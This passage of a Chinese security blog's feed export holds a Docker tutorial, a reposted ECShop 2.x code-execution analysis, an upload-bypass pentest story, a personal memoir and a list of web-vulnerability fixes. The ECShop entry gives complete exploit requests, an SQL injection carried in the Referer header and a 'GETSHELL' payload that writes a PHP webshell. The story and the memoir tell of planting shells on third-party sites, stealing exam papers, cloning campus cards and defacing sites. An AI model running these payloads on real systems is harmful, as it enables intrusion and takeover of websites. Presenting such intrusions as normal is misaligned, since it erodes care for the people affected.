容器的id</code></pre><p>6、查看所有的容器</p><pre><code class="hljs Shell">docker ps -a</code></pre><p>7、启动容器</p><pre><code class="hljs Shell">docker start 容器id</code></pre><p>8、删除一个容器</p><pre><code class="hljs Shell">docker rm 容器id</code></pre><p>9、启动一个做了端口映射的tomcat</p><pre><code class="hljs Shell">[root@localhost ~]# docker run -d -p 8888:8080 tomcat</code></pre><p>-d：后台运行</p><p>-p: 将主机的端口映射到容器的一个端口 主机端口:容器内部的端口</p><p>10、为了演示简单关闭了linux的防火墙</p><p><code>service firewalld status</code> ：查看防火墙状态</p><p><code>service firewalld stop</code>：关闭防火墙</p><p>11、查看容器的日志</p><pre><code class="hljs Shell">docker logs container-name/container-id</code></pre><p>更多命令参看<a href="https://docs.docker.com/engine/reference/commandline/docker/">https://docs.docker.com/engine/reference/commandline/docker/</a>可以参考每一个镜像的文档</p>]]></content>
    
    
    <categories>
      
      <category>学习文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ecshop2.x代码执行</title>
    <link href="/p/1b10c1b1.html"/>
    <url>/p/1b10c1b1.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>问题发生在user.php的display函数，模版变量可控，导致注入，配合注入可达到远程代码执行</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01-SQL注入"></a>0x01-SQL注入</h3><p>先看user.php</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/01.jpg" alt="ecshop2.x代码执行"></p><a id="more"></a><p>$back_act变量来源于HTTP_REFERER，我们可控。</p><p>assign函数用于在模版变量里赋值</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/02.jpg" alt="ecshop2.x代码执行"></p><p>再看display函数</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/03.jpg" alt="ecshop2.x代码执行"></p><p><strong>读取user_passport.dwt模版文件内容，显示解析变量后的html内容，用_echash做分割，得到$k然后交给isnert_mod处理，由于_echash是默认的，不是随机生成的，所以$val内容可随意控制。</strong></p><p>再看insert_mod函数</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/04.jpg" alt="ecshop2.x代码执行"></p><p>非常关键的一个地方，这里进行了动态调用</p><p>$val传入进来用|分割，参数传入进来时需要被序列化</p><p>再看include/lib_insert.php中的insert_ads函数</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/05.jpg" alt="ecshop2.x代码执行"></p><p>可以看到这里直接就能注入了</p><p>payload:</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/user.php?act=login</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 127.0.0.1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="hljs-attribute">Cookie</span>: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1<span class="hljs-attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;&#125;<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Cache-Control</span>: max-age=0</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/06.jpg" alt="ecshop2.x代码执行"></p><h3 id="0x02-代码执行"><a href="#0x02-代码执行" class="headerlink" title="0x02-代码执行"></a>0x02-代码执行</h3><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/07.jpg" alt="ecshop2.x代码执行"></p><p>继续看fetch函数</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/08.jpg" alt="ecshop2.x代码执行"></p><p>追踪_eval函数</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/09.jpg" alt="ecshop2.x代码执行"></p><p>$position_style变量来源于数据库中的查询结构</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/10.jpg" alt="ecshop2.x代码执行"></p><p>然后我们继续构造SQL注入，因为这段sql操作 order by部分换行了截断不了 所以需要在id处构造注释来配合num进行union查询</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/11.jpg" alt="ecshop2.x代码执行"></p><p>payload</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, <span class="hljs-keyword">RAND</span>() <span class="hljs-keyword">AS</span> rnd <span class="hljs-keyword">FROM</span> <span class="hljs-string">`ecshop27`</span>.<span class="hljs-string">`ecs_ad`</span> <span class="hljs-keyword">AS</span> a <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-string">`ecshop27`</span>.<span class="hljs-string">`ecs_ad_position`</span> <span class="hljs-keyword">AS</span> p <span class="hljs-keyword">ON</span> a.position_id = p.position_id <span class="hljs-keyword">WHERE</span> enabled = <span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> start_time &lt;= <span class="hljs-string">&#x27;1535678679&#x27;</span> <span class="hljs-keyword">AND</span> end_time &gt;= <span class="hljs-string">&#x27;1535678679&#x27;</span> <span class="hljs-keyword">AND</span> a.position_id = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">/*&#x27; ORDER BY rnd LIMIT */</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span><span class="hljs-comment">-- -</span></code></pre><p>函数中有一个判断</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/12.jpg" alt="ecshop2.x代码执行"></p><p>我们 id传入’/*</p><p>num传入*/ union select 1,0x272f2a,3,4,5,6,7,8,9,10– -就能绕过了</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/13.jpg" alt="ecshop2.x代码执行"></p><p>var_dump一下</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/14.jpg" alt="ecshop2.x代码执行"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/15.jpg" alt="ecshop2.x代码执行"></p><p>再看fetch函数,传入的参数被fetch_str函数处理了</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/16.jpg" alt="ecshop2.x代码执行"></p><p>追踪fetch_str函数，这里的字符串处理流程比较复杂</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/17.jpg" alt="ecshop2.x代码执行"></p><pre><code class="hljs php"><span class="hljs-keyword">return</span> preg_replace(<span class="hljs-string">&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/e&quot;</span>, <span class="hljs-string">&quot;\$this-&gt;select(&#x27;\\1&#x27;);&quot;</span>, <span class="hljs-variable">$source</span>);</code></pre><p>这一行意思是比如$source是xxxx{$asd}xxx,那么经过这行代码处理后就是返回this-&gt;select(‘$asd’)的结果</p><p>看看select函数</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/18.jpg" alt="ecshop2.x代码执行"></p><p>第一个字符为$时进入$this-&gt;get_val函数</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/19.jpg" alt="ecshop2.x代码执行"></p><p>我们$val没有.$又进入make_var函数</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/20.jpg" alt="ecshop2.x代码执行"></p><p>最后这里引入单引号从变量中逃逸</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/21.jpg" alt="ecshop2.x代码执行"></p><p>我们要闭合_var所以最终payload是</p><pre><code class="hljs php">&#123;<span class="hljs-variable">$asd</span><span class="hljs-string">&#x27;];assert(base64_decode(&#x27;</span>ZmlsZV9wdXRfY29udGVudHMoJzEudHh0JywnZ2V0c2hlbGwnKQ==<span class="hljs-string">&#x27;));//&#125;xxx</span></code></pre><p>会在网站跟目录生成1.txt 里面内容是getshell</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/22.jpg" alt="ecshop2.x代码执行"></p><p>GETSHELL exp:</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/user.php?act=login</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 127.0.0.1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="hljs-attribute">Cookie</span>: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1<span class="hljs-attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:280:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:3:&quot;&#x27;/*&quot;;&#125;<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Cache-Control</span>: max-age=0</code></pre><p>会在网站根目录生成1.php 密码是1337</p><p>文章转载自:<br><a href="http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Ecshop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一个奇葩的上传点</title>
    <link href="/p/7819b580.html"/>
    <url>/p/7819b580.html</url>
    
    <content type="html"><![CDATA[<p>最近一直很忙，V老哥发来一个站，说有一个上传点，问我要不要玩玩，当时太忙，就没去看，等过了几个小时以后，他说还没有突破，然后我叫他把后台和帐号密码发给我试试。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/01.jpg" alt="记一个奇葩的上传点"></p><p>先打开后台看看，发现后台还是挺炫酷的。</p><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/02.jpg" alt="记一个奇葩的上传点"></p><p>用帐号密码登录进后台，找到了上传的地方。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/03.jpg" alt="记一个奇葩的上传点"></p><p>打开burp，创建一个1.mp4文件，里面写phpinfo代码，然后发送到Repeater模块，点击go，可以发现是能够正常上传的。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/04.jpg" alt="记一个奇葩的上传点"></p><p>继续做测试，把文件名改成1.php;mp4</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/05.jpg" alt="记一个奇葩的上传点"></p><p>然后访问一下该页面，发现显示的是源码。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/06.jpg" alt="记一个奇葩的上传点"></p><p>接下来上传了一个1.rar;mp4。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/07.jpg" alt="记一个奇葩的上传点"></p><p>访问以后是下载该文件，正常人到这一步都会怀疑可能存在解析漏洞，但是该文件夹下面没有脚本执行权限。</p><p>接下来把文件名改成1.php试了下，发现上传回显还是mp4格式。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/08.jpg" alt="记一个奇葩的上传点"></p><p>陷入了沉思当中，仔细的看了数据包中的每一个参数，发现Cookie有点猫腻。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/09.jpg" alt="记一个奇葩的上传点"></p><p>于是我把php删除了，然后奇迹发生了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/10.jpg" alt="记一个奇葩的上传点"></p><p>我访问看看，发现可以正常访问的。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/11.jpg" alt="记一个奇葩的上传点"></p><p>于是很激动的发给V哥这个地址，但是他却打不开。。。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/12.jpg" alt="记一个奇葩的上传点"></p><p>至于是什么原因应该是跟那个改了的Cookie有关，最后传了个马上去。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/13.jpg" alt="记一个奇葩的上传点"></p><p>后面的就不写了，我把马丢给V哥以后就不管事了。</p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>七年，当我们成为别人的背影时，我们失去了多少</title>
    <link href="/p/fe9c9fcd.html"/>
    <url>/p/fe9c9fcd.html</url>
    
    <content type="html"><![CDATA[<p>嗯，一个文笔菜如老狗的我，我想写点什么，各位看官看看就好。</p><p>今年20出头，我相信大家入这行大多数都是从刷钻还有帐号被盗开始，我也不例外。<br>记得读初三的时候，开始接触刷钻，那个时候都是用手机卡刷钻。读到高一的时候，也就是那个时候开始，算是刚接触这行吧。<br>那个时候找了个师傅，好像花了50。。。。不过那时候学生党没有多少钱。当时学刷宽带钻，还有什么入侵啥的，反正当时觉得特别牛逼。<br>还有什么入侵三字经，慢慢的发现，叫他教技术总是各种敷衍，后来知道了他是骗子以后，就把我拉黑了。当时为了刷宽带钻，抓鸡而买了一台服务器。</p><a id="more"></a><p>记得那个时候，学习的地方叫做黑基，然后加了群，认识了一个群主叫小风的，还记得有个叫罪叔叔的，总是开玩笑的说卖河南大饼。不过，现在都没联系了。<br>在黑基里面，学过哪些东西我不记得了，只记得当时学什么UBB排版吧，当时写了一个QQ空间的登录页面，那时候读高一，网上认识的一个朋友和我说学习html吧，他也算是我的启蒙老师吧，反正那个时候不会的我都会问他。<br>不记得怎么接触渗透的了，记得有一次，用网上的什么0day，进了别人的后台，好像是个什么新闻的。发现首页有太多日本的字眼，然后我把首页改了，留了自己的ID和QQ号（那时候不懂事，勿喷），那个时候ID好像还叫灰灰（是以前的女朋友起的，现在想起来都觉得我这种大叔类型的人，为啥会用这个ID）。。。。<br>后来上课的时候接到一个电话，是那个网站站长打给我的，问我是不是灰灰，说我在他网站上面留下了QQ号，然后我吓得说了一句你打错了，我在上课，就挂了。<br>当时突然想拿自己的高中学校网站练手，好像就是那个时候认识了土司论坛的恋安，也就是你们说的xuehei大佬，现在想想，和他认识可能也快有5年了，也许更久吧。<br>我当时因为太菜，搞高中学校网站搞不下，然后叫恋安帮我，恋安说了一句从来没见过这么丑的网站。网站是学校老师自己用aspx写的。<br>嗯，老版的网站始终没搞下，现在网站也改新的了。<br>高中毕业后，163邮箱裤子出来了，之前查过学校的域名，是163邮箱注册的，然后用一个网站查到了密码，随手去后台地址试了试，登录成功。<br>起码拿到了学校网站的后台权限，至于shell吧，凡科建站，我是真的无奈。</p><p>由于高中全部在折腾这方面的，学习直接没学，高考考了211，是分数，不是学校。进了一所二流的专科， 大一的时候，选了计算机网络技术，至于html和c语言啥的，我高中就学完了，现在什么都不记得了，反正直接考了个计算机二级C，没屁用的证书。<br>大一的时候，参加了叫赣安杯的比赛，一个人带着两个大二的学长。预赛是做题，当时太菜了，勉勉强强进了决赛。<br>在决赛的时候被老师坑了一波，他告诉我不用带电脑，比赛方会提供的，所以我们三个人就带了一台电脑去，是一个学长的，上面什么都没。在决赛被打得很惨。<br>不过很庆幸，在决赛上认识了vking和另一个老哥（这里不知道ID，不提名字了）。只记得当时v哥台式机都带去了。<br>大一第一次期末考试，莫名的慌，听说考不好会挂科，高考数学29的我，看到高数就头疼。<br>一次偶然的机会，帮教务处的主任装系统，知道了考试卷放在哪台电脑上，后来我神不知鬼不觉的把所有工程系的试卷和答案偷了出来。。。（考卷是随机抽的，最后考了经管系的试卷，只有专业课考了自己老师出的）</p><p>后来看到碧哥破解学校的水卡，至于碧哥，后面再说吧。我当时也买了NFC设备，自己花了一个月的时间算一卡通的加密算法，一卡通有三个功能，吃饭，打水和洗澡。发现卡的数据是存放在卡里的，而且没有任何信息登记。当时去充卡的地方问那个人说我卡掉了，能不能帮我查下有没有人捡到我的卡用我的钱，那个人问我知不知道卡号，我说用名字不能查吗，他说办卡的时候没登记任何信息。我就走了，然后就你们懂的。。。。</p><p>后来考驾照，土豆找我说他要日他们驾校，然后我们一起拿到了服务器权限，后来我也搞了学校驾校一波，但是不知道为什么没有太多妹子信息。</p><p>记得有一次搞一个妹子的学校，拿到了内网权限，当时ms17-010刚出来，我全家桶都搬到服务器上去了，打算慢慢玩。后来，勒索病毒爆发，管理员加班几天，网站入口关了，因为没留后门，导致权限丢失。现在那妹子是我女朋友了。</p><p>记得小时候说过会把小学毕业照挂到学校的网站首页上，刚开始太菜，拿不下。后来我做到了，本来打算挂首页一天，第二天会恢复，后来想想，让黑页留在根目录下吧，也算是怀念下自己的童年。现在网站域名到期了，昨晚看了下被其他学校注册了。。。。</p><p>故事太多，文笔太烂，不知道怎么说，当初认识了渗透吧吧主，当时把我拉进了一个叫大风车的小群。<br>在群里认识了很多人，虽然没学到什么，但是大家都很开心的聊天。<br>但是，现在，进去的进去了，失踪的失踪了。发生了太多了。</p><p>从当初在动车上看到的广告网站我都会动手，到现在看到网站都会苦笑。我真的变了。</p><p>现在也毕业了，前几天刚谈转正工资，3k5。这么多年来，就值3k5，打算撤了。<br>也许会继续做这行，也许会离开这行。<br>这些年失去太多了，真的累了。</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web漏洞合集描述和修复建议</title>
    <link href="/p/83a0ea04.html"/>
    <url>/p/83a0ea04.html</url>
    
    <content type="html"><![CDATA[<div class="note note-success">            <p>人生几何，对酒当歌！</p>          </div><p><code>内容均来自互联网，风险等级根据实际情况定义</code></p><h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>当Web应用程序未对用户输入的数据进行足够的安全处理（如危险字符过滤或者语句过滤），而直接拼接SQL语句执行时，攻击者可以精心构造参数值，使服务器执行非预期的SQL语句并返回结果，造成数据库信息泄露。利用SQL注入漏洞，攻击者可获取数据库的增、删、改、查权限，甚至执行系统命令，上传后门文件等。</p><a id="more"></a><p><strong>加固建议：</strong><br>针对SQL注入漏洞，需要对网站所有参数中提交的数据进行过滤，禁止输入”‘“、”xor”、”or”、”–”、”#”、”select”、”and”等特殊字符；所有的查询语句都使用数据库提供的参数化查询接口，SQL语句使用参数化处理后的数据作为输入,而不是将用户输入变量嵌入到SQL语句中；严格限制网站用户对数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害；避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者收集这些错误信息进行判断进而执行SQL注入攻击。</p><h2 id="XSS跨站脚本漏洞"><a href="#XSS跨站脚本漏洞" class="headerlink" title="XSS跨站脚本漏洞"></a>XSS跨站脚本漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>跨站脚本攻击是通过在网页中加入恶意代码，当访问者浏览网页时恶意代码会被执行，攻击者可利用该漏洞窃取或操纵客户会话和 cookie，用来模仿合法用户，从而使攻击者获得管理员权限，控制整个网站。<br><strong>加固建议：</strong><br>1.在cookie中设置了HttpOnly属性，那么通过JavaScript脚本将无法读取到cookie信息，这样能一定程度上防止XSS攻击。<br>2.假定所有输入都是可疑的，必须对所有输入中的script、iframe等字样进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的cookie中的变量，HTTP请求头部中的变量等。<br>3.不仅验证数据的类型，还要验证其格式、长度、范围和内容。<br>4.过滤“&lt;” 、“&gt;” 将用户输入放入引号间，基本实现数据与代码隔离；过滤双引号防止用户跨越许可的标记，添加自定义标记；过滤TAB和空格,防止关键字被拆分；过滤script关键字；过滤&amp;#,防止HTML属性绕过检查。在客户端和服务器端同时做数据的验证与过滤。<br>5.对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。</p><h2 id="CRLF注入漏洞"><a href="#CRLF注入漏洞" class="headerlink" title="CRLF注入漏洞"></a>CRLF注入漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。HRS是比XSS危害更大的安全问题。<br><strong>加固建议：</strong><br>针对CRLF注入漏洞，建议过滤\r 、\n等特殊字符，避免输入的数据污染到其他HTTP头。</p><h2 id="URL重定向钓鱼"><a href="#URL重定向钓鱼" class="headerlink" title="URL重定向钓鱼"></a>URL重定向钓鱼</h2><p><strong>风险级别：</strong><font color="#ff0000"  